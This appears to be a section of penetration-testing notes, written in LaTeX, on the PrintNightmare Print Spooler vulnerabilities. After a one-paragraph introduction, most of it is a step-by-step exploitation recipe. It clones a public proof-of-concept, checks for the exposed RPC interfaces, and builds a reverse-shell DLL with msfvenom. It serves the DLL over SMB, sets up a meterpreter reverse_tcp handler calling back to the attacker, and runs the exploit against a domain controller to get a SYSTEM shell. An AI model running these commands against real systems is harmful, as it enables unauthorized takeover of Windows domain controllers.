
\section{PrintNightmare}
\subsection{Intro}
PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and
CVE-2021-1675) found in the
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc}{Print
Spooler service} that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. 


\subsection{metasploit}
\verb+use exploit/windows/local/ricoh_driver_privesc+
\subsection{Exploit}
\begin{enumerate}
    \item \verb+git clone https://github.com/cube0x0/CVE-2021-1675.git+
    \item verify if \emph{Print System Asynchronous Protocol} and
\emph{Print System Remote Protocol} are exposed on the target.
\begin{verbatim}
\verb+rpcdump.py @DC-IP | egrep 'MS-RPRN|MS-PAR'+
\end{verbatim}

    \item Craft a DLL reverse shell with msfvenom~\ref{tool:metasploit:msfvenom}
    \item host the DLL shell with
        \verb+smbserver+~\ref{tool:impacket:smbserver}
    \item Configuring \& Starting metasploit multi/handler:
\begin{verbatim}
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
run
\end{verbatim}
    \item run the exploit:
\begin{verbatim}
sudo python3 CVE-2021-1675.py DOMAIN.NAME/login:pawword@DC-IP \
    '\\LHOST\PATH\TO\DLL'
\end{verbatim}
    \item Metasploit drop into SYSTEM shell
\begin{verbatim}
shell
whoami
\end{verbatim}
\end{enumerate}
